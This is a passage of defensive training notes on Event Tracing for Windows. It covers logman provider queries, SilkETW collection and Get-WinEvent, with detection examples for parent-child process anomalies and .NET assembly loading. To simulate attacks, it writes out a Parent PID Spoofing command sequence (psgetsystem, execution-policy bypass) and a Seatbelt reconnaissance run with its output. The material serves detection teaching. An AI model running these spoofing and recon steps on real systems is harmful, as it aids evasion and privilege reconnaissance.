Filter Type:          0

Provider:
Name:                 Microsoft-Windows-Subsys-SMSS
Provider Guid:        {43E63DA5-41D1-4FBF-ADED-1BBED98FDD1D}
Level:                255
KeywordsAll:          0x0
KeywordsAny:          0x4000000000000000 (System)
Properties:           65
Filter Type:          0

Provider:
Name:                 Microsoft-Windows-Kernel-General
Provider Guid:        {A68CA8B7-004F-D7B6-A698-07E2DE0F1F5D}
Level:                255
KeywordsAll:          0x0
KeywordsAny:          0x8000000000000000 (System)
Properties:           65
Filter Type:          0

Provider:
Name:                 Microsoft-Windows-FilterManager
Provider Guid:        {F3C5E28E-63F6-49C7-A204-E48A1BC4B09D}
Level:                255
KeywordsAll:          0x0
KeywordsAny:          0x8000000000000000 (System)
Properties:           65
Filter Type:          0

--- SNIP ---

The command completed successfully.
```

By using the logman query providers command, we can generate a list of all available providers on the system, including their respective GUIDs.


```
C:\Tools> logman.exe query providers

Provider                                 GUID
-------------------------------------------------------------------------------
ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}
Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}
Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}
Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}
ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}
ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}
Application Popup                        {47BFA2B7-BD54-4FAC-B70B-29021084CA8F}
Application-Addon-Event-Provider         {A83FA99F-C356-4DED-9FD6-5A5EB8546D68}
ATA Port Driver Tracing Provider         {D08BD885-501E-489A-BAC6-B7D24BFE6BBF}
AuthFw NetShell Plugin                   {935F4AE6-845D-41C6-97FA-380DAD429B72}
BCP.1                                    {24722B88-DF97-4FF6-E395-DB533AC42A1E}
BFE Trace Provider                       {106B464A-8043-46B1-8CB8-E92A0CD7A560}
BITS Service Trace                       {4A8AAA94-CFC4-46A7-8E4E-17BC45608F0A}
Certificate Services Client CredentialRoaming Trace {EF4109DC-68FC-45AF-B329-CA2825437209}
Certificate Services Client Trace        {F01B7774-7ED7-401E-8088-B576793D7841}
Circular Kernel Session Provider         {54DEA73A-ED1F-42A4-AF71-3E63D056F174}
Classpnp Driver Tracing Provider         {FA8DE7C4-ACDE-4443-9994-C4E2359A9EDB}
Critical Section Trace Provider          {3AC66736-CC59-4CFF-8115-8DF50E39816B}
DBNETLIB.1                               {BD568F20-FCCD-B948-054E-DB3421115D61}
Deduplication Tracing Provider           {5EBB59D1-4739-4E45-872D-B8703956D84B}
Disk Class Driver Tracing Provider       {945186BF-3DD6-4F3F-9C8E-9EDD3FC9D558}
Downlevel IPsec API                      {94335EB3-79EA-44D5-8EA9-306F49B3A041}
Downlevel IPsec NetShell Plugin          {E4FF10D8-8A88-4FC6-82C8-8C23E9462FE5}
Downlevel IPsec Policy Store             {94335EB3-79EA-44D5-8EA9-306F49B3A070}
Downlevel IPsec Service                  {94335EB3-79EA-44D5-8EA9-306F49B3A040}
EA IME API                               {E2A24A32-00DC-4025-9689-C108C01991C5}
Error Instrument                         {CD7CF0D0-02CC-4872-9B65-0DBA0A90EFE8}
FD Core Trace                            {480217A9-F824-4BD4-BBE8-F371CAAF9A0D}
FD Publication Trace                     {649E3596-2620-4D58-A01F-17AEFE8185DB}
FD SSDP Trace                            {DB1D0418-105A-4C77-9A25-8F96A19716A4}
FD WNet Trace                            {8B20D3E4-581F-4A27-8109-DF01643A7A93}
FD WSDAPI Trace                          {7E2DBFC7-41E8-4987-BCA7-76CADFAD765F}
FDPHost Service Trace                    {F1C521CA-DA82-4D79-9EE4-D7A375723B68}
File Kernel Trace; Operation Set 1       {D75D8303-6C21-4BDE-9C98-ECC6320F9291}
File Kernel Trace; Operation Set 2       {058DD951-7604-414D-A5D6-A56D35367A46}
File Kernel Trace; Optional Data         {7DA1385C-F8F5-414D-B9D0-02FCA090F1EC}
File Kernel Trace; Volume To Log         {127D46AF-4AD3-489F-9165-F00BA64D5467}
FWPKCLNT Trace Provider                  {AD33FA19-F2D2-46D1-8F4C-E3C3087E45AD}
FWPUCLNT Trace Provider                  {5A1600D2-68E5-4DE7-BCF4-1C2D215FE0FE}
Heap Trace Provider                      {222962AB-6180-4B88-A825-346B75F2A24A}
IKEEXT Trace Provider                    {106B464D-8043-46B1-8CB8-E92A0CD7A560}
IMAPI1 Shim                              {1FF10429-99AE-45BB-8A67-C9E945B9FB6C}
IMAPI2 Concatenate Stream                {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9D}
IMAPI2 Disc Master                       {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E91}
IMAPI2 Disc Recorder                     {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E93}
IMAPI2 Disc Recorder Enumerator          {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E92}
IMAPI2 dll                               {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E90}
IMAPI2 Interleave Stream                 {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9E}
IMAPI2 Media Eraser                      {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E97}
IMAPI2 MSF                               {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9F}
IMAPI2 Multisession Sequential           {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7EA0}
IMAPI2 Pseudo-Random Stream              {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9C}
IMAPI2 Raw CD Writer                     {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9A}
IMAPI2 Raw Image Writer                  {07E397EC-C240-4ED7-8A2A-B9FF0FE5D581}
IMAPI2 Standard Data Writer              {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E98}
IMAPI2 Track-at-Once CD Writer           {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E99}
IMAPI2 Utilities                         {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E94}
IMAPI2 Write Engine                      {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E96}
IMAPI2 Zero Stream                       {0E85A5A5-4D5C-44B7-8BDA-5B7AB54F7E9B}
IMAPI2FS Tracing                         {F8036571-42D9-480A-BABB-DE7833CB059C}
Intel-iaLPSS-GPIO                        {D386CC7A-620A-41C1-ABF5-55018C6C699A}
Intel-iaLPSS-I2C                         {D4AEAC44-AD44-456E-9C90-33F8CDCED6AF}
Intel-iaLPSS2-GPIO2                      {63848CFF-3EC7-4DDF-8072-5F95E8C8EB98}
Intel-iaLPSS2-I2C                        {C2F86198-03CA-4771-8D4C-CE6E15CBCA56}
IPMI Driver Trace                        {D5C6A3E9-FA9C-434E-9653-165B4FC869E4}
IPMI Provider Trace                      {651D672B-E11F-41B7-ADD3-C2F6A4023672}
KMDFv1 Trace Provider                    {544D4C9D-942C-46D5-BF50-DF5CD9524A50}
Layer2 Security HC Diagnostics Trace     {2E8D9EC5-A712-48C4-8CE0-631EB0C1CD65}
Local Security Authority (LSA)           {CC85922F-DB41-11D2-9244-006008269001}
LsaSrv                                   {199FE037-2B82-40A9-82AC-E1D46C792B99}
Microsoft-Antimalware-AMFilter           {CFEB0608-330E-4410-B00D-56D8DA9986E6}
Microsoft-Antimalware-Engine             {0A002690-3839-4E3A-B3B6-96D8DF868D99}
Microsoft-Antimalware-Engine-Instrumentation {68621C25-DF8D-4A6B-AABC-19A22E296A7C}
Microsoft-Antimalware-NIS                {102AAB0A-9D9C-4887-A860-55DE33B96595}
Microsoft-Antimalware-Protection         {E4B70372-261F-4C54-8FA6-A5A7914D73DA}
Microsoft-Antimalware-RTP                {8E92DEEF-5E17-413B-B927-59B2F06A3CFC}
Microsoft-Antimalware-Scan-Interface     {2A576B87-09A7-520E-C21A-4942F0271D67}
Microsoft-Antimalware-Service            {751EF305-6C6E-4FED-B847-02EF79D26AEF}
Microsoft-Antimalware-ShieldProvider     {928F7D29-0577-5BE5-3BD3-B6BDAB9AB307}
Microsoft-Antimalware-UacScan            {D37E7910-79C8-57C4-DA77-52BB646364CD}
Microsoft-AppV-Client                    {E4F68870-5AE8-4E5B-9CE7-CA9ED75B0245}
Microsoft-AppV-Client-StreamingUX        {28CB46C7-4003-4E50-8BD9-442086762D12}
Microsoft-AppV-ServiceLog                {9CC69D1C-7917-4ACD-8066-6BF8B63E551B}
Microsoft-AppV-SharedPerformance         {FB4A19EE-EB5A-47A4-BC52-E71AAC6D0859}
Microsoft-Client-Licensing-Platform      {B6CC0D55-9ECC-49A8-B929-2B9022426F2A}
Microsoft-Gaming-Services                {BC1BDB57-71A2-581A-147B-E0B49474A2D4}
Microsoft-IE                             {9E3B3947-CA5D-4614-91A2-7B624E0E7244}
Microsoft-IE-JSDumpHeap                  {7F8E35CA-68E8-41B9-86FE-D6ADC5B327E7}
Microsoft-IEFRAME                        {5C8BB950-959E-4309-8908-67961A1205D5}
Microsoft-JScript                        {57277741-3638-4A4B-BDBA-0AC6E45DA56C}
Microsoft-OneCore-OnlineSetup            {41862974-DA3B-4F0B-97D5-BB29FBB9B71E}
Microsoft-PerfTrack-IEFRAME              {B2A40F1F-A05A-4DFD-886A-4C4F18C4334C}
Microsoft-PerfTrack-MSHTML               {FFDB9886-80F3-4540-AA8B-B85192217DDF}
Microsoft-User Experience Virtualization-Admin {61BC445E-7A8D-420E-AB36-9C7143881B98}
Microsoft-User Experience Virtualization-Agent Driver {DE29CF61-5EE6-43FF-9AAC-959C4E13CC6C}
Microsoft-User Experience Virtualization-App Agent {1ED6976A-4171-4764-B415-7EA08BC46C51}
Microsoft-User Experience Virtualization-IPC {21D79DB0-8E03-41CD-9589-F3EF7001A92A}
Microsoft-User Experience Virtualization-SQM Uploader {57003E21-269B-4BDC-8434-B3BF8D57D2D5}
Microsoft-Windows Networking VPN Plugin Platform {E5FC4A0F-7198-492F-9B0F-88FDCBFDED48}
Microsoft-Windows-AAD                    {4DE9BC9C-B27A-43C9-8994-0915F1A5E24F}
Microsoft-Windows-ACL-UI                 {EA4CC8B8-A150-47A3-AFB9-C8D194B19452}

The command completed successfully.
```

Windows 10 includes more than 1,000 built-in providers. Moreover, Third-Party Software often incorporates its own ETW providers, especially those operating in Kernel mode.

Due to the high number of providers, it's usually advantageous to filter them using findstr. For instance, you will see multiple results for "Winlogon" in the given example.

```
C:\Tools> logman.exe query providers | findstr "Winlogon"
Microsoft-Windows-Winlogon               {DBE9B383-7CF3-4331-91CC-A3CB16A3B538}
Windows Winlogon Trace                   {D451642C-63A6-11D7-9720-00B0D03E0347}
```

By specifying a provider with Logman, we gain a deeper understanding of the provider's function. This will inform us about the Keywords we can filter on, the available event levels, and which processes are currently utilizing the provider.

```
C:\Tools> logman.exe query providers Microsoft-Windows-Winlogon

Provider                                 GUID
-------------------------------------------------------------------------------
Microsoft-Windows-Winlogon               {DBE9B383-7CF3-4331-91CC-A3CB16A3B538}

Value               Keyword              Description
-------------------------------------------------------------------------------
0x0000000000010000  PerfInstrumentation
0x0000000000020000  PerfDiagnostics
0x0000000000040000  NotificationEvents
0x0000000000080000  PerfTrackContext
0x0000100000000000  ms:ReservedKeyword44
0x0000200000000000  ms:Telemetry
0x0000400000000000  ms:Measures
0x0000800000000000  ms:CriticalData
0x0001000000000000  win:ResponseTime     Response Time
0x0080000000000000  win:EventlogClassic  Classic
0x8000000000000000  Microsoft-Windows-Winlogon/Diagnostic
0x4000000000000000  Microsoft-Windows-Winlogon/Operational
0x2000000000000000  System               System

Value               Level                Description
-------------------------------------------------------------------------------
0x02                win:Error            Error
0x03                win:Warning          Warning
0x04                win:Informational    Information

PID                 Image
-------------------------------------------------------------------------------
0x00001710
0x0000025c


The command completed successfully.
```
The Microsoft-Windows-Winlogon/Diagnostic and Microsoft-Windows-Winlogon/Operational keywords reference the event logs generated from this provider.

GUI-based alternatives also exist. These are:

1. Using the graphical interface of the Performance Monitor tool, we can visualize various running trace sessions. A detailed overview of a specific trace can be accessed simply by double-clicking on it. This reveals all pertinent data related to the trace, from the engaged providers and their activated features to the nature of the trace itself. Additionally, these sessions can be modified to suit our needs by incorporating or eliminating providers. Lastly, we can devise new sessions by opting for the "User Defined" category.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/79cbbb0c-4453-4996-8c69-bbc1a339c82f)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d05e5876-0bbb-4863-83dc-5e5a7f040d22)

2. ETW Provider metadata can also be viewed through the EtwExplorer project.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/37cdb129-0a87-4370-ad05-88f4a3baf2cc)

### Useful Providers

- Microsoft-Windows-Kernel-Process: This ETW provider is instrumental in monitoring process-related activity within the Windows kernel. It can aid in detecting unusual process behaviors such as process injection, process hollowing, and other tactics commonly used by malware and advanced persistent threats (APTs).
Microsoft-Windows-Kernel-File: As the name suggests, this provider focuses on file-related operations. It can be employed for detection scenarios involving unauthorized file access, changes to critical system files, or suspicious file operations indicative of exfiltration or ransomware activity.
- Microsoft-Windows-Kernel-Network: This ETW provider offers visibility into network-related activity at the kernel level. It's especially useful in detecting network-based attacks such as data exfiltration, unauthorized network connections, and potential signs of command and control (C2) communication.
- Microsoft-Windows-SMBClient/SMBServer: These providers monitor Server Message Block (SMB) client and server activity, providing insights into file sharing and network communication. They can be used to detect unusual SMB traffic patterns, potentially indicating lateral movement or data exfiltration.
- Microsoft-Windows-DotNETRuntime: This provider focuses on .NET runtime events, making it ideal for identifying anomalies in .NET application execution, potential exploitation of .NET vulnerabilities, or malicious .NET assembly loading.
- OpenSSH: Monitoring the OpenSSH ETW provider can provide important insights into Secure Shell (SSH) connection attempts, successful and failed authentications, and potential brute force attacks.
- Microsoft-Windows-VPN-Client: This provider enables tracking of Virtual Private Network (VPN) client events. It can be useful for identifying unauthorized or suspicious VPN connections.
- Microsoft-Windows-PowerShell: This ETW provider tracks PowerShell execution and command activity, making it invaluable for detecting suspicious PowerShell usage, script block logging, and potential misuse or exploitation.
- Microsoft-Windows-Kernel-Registry: This provider monitors registry operations, making it useful for detection scenarios related to changes in registry keys, often associated with persistence mechanisms, malware installation, or system configuration changes.
- Microsoft-Windows-CodeIntegrity: This provider monitors code and driver integrity checks, which can be key in identifying attempts to load unsigned or malicious drivers or code.
- Microsoft-Antimalware-Service: This ETW provider can be employed to detect potential issues with the antimalware service, including disabled services, configuration changes, or potential evasion techniques employed by malware.
- WinRM: Monitoring the Windows Remote Management (WinRM) provider can reveal unauthorized or suspicious remote management activity, often indicative of lateral movement or remote command execution.
- Microsoft-Windows-TerminalServices-LocalSessionManager: This provider tracks local Terminal Services sessions, making it useful for detecting unauthorized or suspicious remote desktop activity.
- Microsoft-Windows-Security-Mitigations: This provider keeps tabs on the effectiveness and operations of security mitigations in place. It's essential for identifying potential bypass attempts of these security controls.
- Microsoft-Windows-DNS-Client: This ETW provider gives visibility into DNS client activity, which is crucial for detecting DNS-based attacks, including DNS tunneling or unusual DNS requests that may indicate C2 communication.
- Microsoft-Antimalware-Protection: This provider monitors the operations of antimalware protection mechanisms. It can be used to detect any issues with these mechanisms, such as disabled protection features, configuration changes, or signs of evasion techniques employed by malicious actors.

**Restricted Providers**

n the realm of Windows operating system security, certain ETW providers are considered "restricted." These providers offer valuable telemetry but are only accessible to processes that carry the requisite permissions. This exclusivity is designed to ensure that sensitive system data remains shielded from potential threats.

One of these high-value, restricted providers is Microsoft-Windows-Threat-Intelligence. This provider offers crucial insights into potential security threats and is often leveraged in Digital Forensics and Incident Response (DFIR) operations. However, to access this provider, processes must be privileged with a specific right, known as Protected Process Light (PPL).

According to Elastic:To be able to run as a PPL, an anti-malware vendor must apply to Microsoft, prove their identity, sign binding legal documents, implement an Early Launch Anti-Malware (ELAM) driver, run it through a test suite, and submit it to Microsoft for a special Authenticode signature. It is not a trivial process. Once this process is complete, the vendor can use this ELAM driver to have Windows protect their anti-malware service by running it as a PPL. With that said, workarounds to access the Microsoft-Windows-Threat-Intelligence provider exist.

In the context of Microsoft-Windows-Threat-Intelligence, the benefits of this privileged access are manifold. This provider can record highly granular data about potential threats, enabling security professionals to detect and analyze sophisticated attacks that may have eluded other defenses. Its telemetry can serve as vital evidence in forensic investigations, revealing details about the origin of a threat, the systems and data it interacted with, and the alterations it made. Moreover, by monitoring this provider in real-time, security teams can potentially identify ongoing threats and intervene to mitigate damage.

In the next section, we will utilize ETW to investigate attacks that may evade detection if we rely solely on Sysmon for monitoring and analysis, due to its inherent limitations in capturing certain events.

### References
- https://nasbench.medium.com/a-primer-on-event-tracing-for-windows-etw-997725c082bf
- https://bmcder.com/blog/a-begginers-all-inclusive-guide-to-etw

### Tapping Into ETW

### Detection Example 1: Detecting Strange Parent-Child Relationships

Abnormal parent-child relationships among processes can be indicative of malicious activities. In standard Windows environments, certain processes never call or spawn others. For example, it is highly unlikely to see "calc.exe" spawning "cmd.exe" in a normal Windows environment. Understanding these typical parent-child relationships can assist in detecting anomalies. Samir Bousseaden has shared an insightful mind map introducing common parent-child relationships, which can be referenced here

By utilizing Process Hacker, we can explore parent-child relationships within Windows. Sorting the processes by dropdowns in the Processes view reveals a hierarchical representation of the relationships.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5cf70063-a2bb-4182-a0d5-86a01587c036)


Analyzing these relationships in standard and custom environments enables us to identify deviations from normal patterns. For example, if we observe the "spoolsv.exe" process creating "whoami.exe" instead of its expected behavior of creating a "conhost", it raises suspicion.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/55186212-1064-48fe-93f6-2d28e227a11e)

To showcase a strange parent-child relationship, where "cmd.exe" appears to be created by "spoolsv.exe" with no accompanying arguments, we will utilize an attacking technique called Parent PID Spoofing. Parent PID Spoofing can be executed through the psgetsystem project in the following manner.

```
PS C:\Tools\psgetsystem> powershell -ep bypass
PS C:\Tools\psgetsystem> Import-Module .\psgetsys.ps1 
PS C:\Tools\psgetsystem> [MyProcess]::CreateProcessFromParent([Process ID of spoolsv.exe],"C:\Windows\System32\cmd.exe","")
```
![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/aa35b069-8a26-48a4-897a-31a49b48c867)

Due to the parent PID spoofing technique we employed, Sysmon Event 1 incorrectly displays spoolsv.exe as the parent of cmd.exe. However, it was actually powershell.exe that created cmd.exe.

As we have previously discussed, although Sysmon and event logs provide valuable telemetry for hunting and creating alert rules, they are not the only sources of information. Let's begin by collecting data from the Microsoft-Windows-Kernel-Process provider using SilkETW (the provider can be identified using logman as we described previously, logman.exe query providers | findstr "Process"). After that, we can proceed to simulate the attack again to assess whether ETW can provide us with more accurate information regarding the execution of cmd.exe.

```
c:\Tools\SilkETW_SilkService_v8\v8\SilkETW>SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json
```

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/54ad1c8e-815c-4223-8faa-e7b8602ad796)

The etw.json file (that includes data from the Microsoft-Windows-Kernel-Process provider) seems to contain information about powershell.exe being the one who created cmd.exe.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/904c8ba1-008f-428c-bc29-6de3c4ff8f42)

It should be noted that SilkETW event logs can be ingested and viewed by Windows Event Viewer through SilkService to provide us with deeper and more extensive visibility into the actions performed on a system.

**Detection Example 2: Detecting Malicious .NET Assembly Loading**

Traditionally, adversaries employed a strategy known as "Living off the Land" (LotL), exploiting legitimate system tools, such as PowerShell, to carry out their malicious operations. This approach reduces the risk of detection since it involves the use of tools that are native to the system, and therefore less likely to raise suspicion.

However, the cybersecurity community has adapted and developed countermeasures against this strategy.

Responding to these defensive advancements, attackers have developed a new approach that Mandiant labels as "Bring Your Own Land" (BYOL). Instead of relying on the tools already present on a victim's system, threat actors and penetration testers emulating these tactics now employ .NET assemblies executed entirely in memory. This involves creating custom-built tools using languages like C#, rendering them independent of the pre-existing tools on the target system. The "Bring Your Own Land" lands is quite effective for the following reasons:

- Each Windows system comes equipped with a certain version of .NET pre-installed by default.
- A salient feature of .NET is its managed nature, alleviating the need for programmers to manually handle memory management. This attribute is part of the framework's managed code execution process, where the Common Language Runtime (CLR) takes responsibility for key system-level operations such as garbage collection, eliminating memory leaks and ensuring more efficient resource utilization.
- One of the intriguing advantages of using .NET assemblies is their ability to be loaded directly into memory. This means that an executable or DLL does not need to be written physically to the disk - instead, it is executed directly in memory. This behavior minimizes the artifacts left behind on the system and can help bypass some forms of detection that rely on inspecting files written to disk.
- Microsoft has integrated a wide range of libraries into the .NET framework to address numerous common programming challenges. These libraries include functionalities for establishing HTTP connections, implementing cryptographic operations, and enabling inter-process communication (IPC), such as named pipes. These pre-built tools streamline the development process, reduce the likelihood of errors, and make it easier to build robust and efficient applications. Furthermore, for a threat actor, these rich features provide a toolkit for creating more sophisticated and covert attack methods.

A powerful illustration of this BYOL strategy is the "execute-assembly" command implemented in CobaltStrike, a widely-used software platform for Adversary Simulations and Red Team Operations. CobaltStrike's 'execute-assembly' command allows the user to execute .NET assemblies directly from memory, making it an ideal tool for implementing a BYOL strategy.

In a manner akin to how we detected the execution of unmanaged PowerShell scripts through the observation of anomalous clr.dll and clrjit.dll loading activity in processes that ordinarily wouldn't require them, we can employ a similar approach to identify malicious .NET assembly loading. This is achieved by scrutinizing the activity related to the loading of .NET-associated DLLs, specifically clr.dll and mscoree.dll.

Monitoring the loading of such libraries can help reveal attempts to execute .NET assemblies in unusual or unexpected contexts, which can be a sign of malicious activity. This type of DLL loading behavior can often be detected by leveraging Sysmon's Event ID 7, which corresponds to "Image Loaded" events.

For demonstrative purposes, let's emulate a malicious .NET assembly load by executing a precompiled version of Seatbelt that resides on disk. Seatbelt is a well-known .NET assembly, often employed by adversaries who load and execute it in memory to gain situational awareness on a compromised system.

```
PS C:\Tools\GhostPack Compiled Binaries>.\Seatbelt.exe TokenPrivileges

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== TokenPrivileges ======

Current Token's Privileges

                     SeIncreaseQuotaPrivilege:  DISABLED
                          SeSecurityPrivilege:  DISABLED
                     SeTakeOwnershipPrivilege:  DISABLED
                        SeLoadDriverPrivilege:  DISABLED
                     SeSystemProfilePrivilege:  DISABLED
                        SeSystemtimePrivilege:  DISABLED
              SeProfileSingleProcessPrivilege:  DISABLED
              SeIncreaseBasePriorityPrivilege:  DISABLED
                    SeCreatePagefilePrivilege:  DISABLED
                            SeBackupPrivilege:  DISABLED
                           SeRestorePrivilege:  DISABLED
                          SeShutdownPrivilege:  DISABLED
                             SeDebugPrivilege:  SE_PRIVILEGE_ENABLED
                 SeSystemEnvironmentPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                    SeRemoteShutdownPrivilege:  DISABLED
                            SeUndockPrivilege:  DISABLED
                      SeManageVolumePrivilege:  DISABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                          SeTimeZonePrivilege:  DISABLED
                SeCreateSymbolicLinkPrivilege:  DISABLED
    SeDelegateSessionUserImpersonatePrivilege:  DISABLED
```

Assuming we have Sysmon configured appropriately to log image loading events (Event ID 7), executing 'Seatbelt.exe' would trigger the loading of key .NET-related DLLs such as 'clr.dll' and 'mscoree.dll'. Sysmon, keenly observing system activities, will log these DLL load operations as Event ID 7 records.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/498a7ca5-49cd-404f-879b-fddc1be0ac74)

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e4b9da4d-a513-4486-b554-7483a2a3ec70)

As already mentioned, relying solely on Sysmon Event ID 7 for detecting attacks can be challenging due to the large volume of events it generates (especially if not configured properly). Additionally, while it informs us about the DLLs being loaded, it doesn't provide granular details about the actual content of the loaded .NET assembly.

To augment our visibility and gain deeper insights into the actual assembly being loaded, we can again leverage Event Tracing for Windows (ETW) and specifically the Microsoft-Windows-DotNETRuntime provider.

Let's use SilkETW to collect data from the Microsoft-Windows-DotNETRuntime provider. After that, we can proceed to simulate the attack again to evaluate whether ETW can furnish us with more detailed and actionable intelligence regarding the loading and execution of the 'Seatbelt' .NET assembly.


```
c:\Tools\SilkETW_SilkService_v8\v8\SilkETW>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json
```
The etw.json file (that includes data from the Microsoft-Windows-DotNETRuntime provider) seems to contain a wealth of information about the loaded assembly, including method names.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/8732bca7-e519-4a03-af72-477aab8827aa)


It's worth noting that in our current SilkETW configuration, we're not capturing the entirety of events from the "Microsoft-Windows-DotNETRuntime" provider. Instead, we're selectively targeting a specific subset (indicated by 0x2038), which includes: JitKeyword, InteropKeyword, LoaderKeyword, and NGenKeyword.

- The JitKeyword relates to the Just-In-Time (JIT) compilation events, providing information on the methods being compiled at runtime. This could be particularly useful for understanding the execution flow of the .NET assembly.
- The InteropKeyword refers to Interoperability events, which come into play when managed code interacts with unmanaged code. These events could provide insights into potential interactions with native APIs or other unmanaged components.
- LoaderKeyword events provide details on the assembly loading process within the .NET runtime, which can be vital for understanding what .NET assemblies are being loaded and potentially executed.
- Lastly, the NGenKeyword corresponds to Native Image Generator (NGen) events, which are concerned with the creation and usage of precompiled .NET assemblies. Monitoring these could help detect scenarios where attackers use precompiled .NET assemblies to evade JIT-related detections.

### Get-WinEvent 
Understanding the importance of mass analysis of Windows Event Logs and Sysmon logs is pivotal in the realm of cybersecurity, especially in Incident Response (IR) and threat hunting scenarios. These logs hold invaluable information about the state of your systems, user activities, potential threats, system changes, and troubleshooting information. However, these logs can also be voluminous and unwieldy. For large-scale organizations, it's not uncommon to generate millions of logs each day. Hence, to distill useful information from these logs, we require efficient tools and techniques to analyze these logs en masse.

One of these tools is the the Get-WinEvent cmdlet in PowerShell.

### Using Get-WinEvent

The Get-WinEvent cmdlet is an indispensable tool in PowerShell for querying Windows Event logs en masse. The cmdlet provides us with the capability to retrieve different types of event logs, including classic Windows event logs like System and Application logs, logs generated by Windows Event Log technology, and Event Tracing for Windows (ETW) logs.

To quickly identify the available logs, we can leverage the -ListLog parameter in conjunction with the Get-WinEvent cmdlet. By specifying * as the parameter value, we retrieve all logs without applying any filtering criteria. This allows us to obtain a comprehensive list of logs and their associated properties. By executing the following command, we can retrieve the list of logs and display essential properties such as LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, and LogType. The | character is a pipe operator. It is used to pass the output of one command (in this case, the Get-WinEvent command) to another command (in this case, the Select-Object command).

```
PS C:\Users\Administrator> Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize

LogName                                                                                RecordCount IsClassicLog IsEnabled  LogMode        LogType
-------                                                                                ----------- ------------ ---------  -------        -------
Windows PowerShell                                                                            2916         True      True Circular Administrative
System                                                                                        1786         True      True Circular Administrative
Security                                                                                      8968         True      True Circular Administrative
Key Management Service                                                                           0         True      True Circular Administrative
Internet Explorer                                                                                0         True      True Circular Administrative
HardwareEvents                                                                                   0         True      True Circular Administrative
Application                                                                                   2079         True      True Circular Administrative
Windows Networking Vpn Plugin Platform/OperationalVerbose                                                 False     False Circular    Operational
Windows Networking Vpn Plugin Platform/Operational                                                        False     False Circular    Operational
SMSApi                                                                                           0        False      True Circular    Operational
Setup                                                                                           16        False      True Circular    Operational
OpenSSH/Operational                                                                              0        False      True Circular    Operational
OpenSSH/Admin                                                                                    0        False      True Circular Administrative
Network Isolation Operational                                                                             False     False Circular    Operational
Microsoft-WindowsPhone-Connectivity-WiFiConnSvc-Channel                                          0        False      True Circular    Operational
Microsoft-Windows-WWAN-SVC-Events/Operational                                                    0        False      True Circular    Operational
Microsoft-Windows-WPD-MTPClassDriver/Operational                                                 0        False      True Circular    Operational
Microsoft-Windows-WPD-CompositeClassDriver/Operational                                           0        False      True Circular    Operational
Microsoft-Windows-WPD-ClassInstaller/Operational                                                 0        False      True Circular    Operational
Microsoft-Windows-Workplace Join/Admin                                                           0        False      True Circular Administrative
Microsoft-Windows-WorkFolders/WHC                                                                0        False      True Circular    Operational
